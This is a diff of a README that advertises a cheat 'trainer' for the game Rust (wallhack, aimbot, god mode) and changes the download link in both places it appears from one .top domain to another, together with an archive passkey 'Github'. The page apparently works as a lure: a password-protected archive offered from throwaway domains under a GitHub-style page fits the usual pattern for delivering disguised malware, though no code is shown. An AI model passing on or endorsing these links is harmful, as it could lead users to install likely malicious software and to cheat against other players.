@@ -9,7 +9,7 @@ Rust trainer with ESP wallhack, aimbot, god mode, no recoil, infinite resources,
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -101,7 +101,7 @@ Based on community tools and regular updates for the latest game version.
 
 ## 🔧 Installation / How to Use
 
-1. Download the latest release by clicking **[CLICK](https://gitappdown.top/)**.
+1. Download the latest release by clicking **[CLICK](https://gitdownapply.top)**.
 
 2. Launch Rust and load into the game.
 
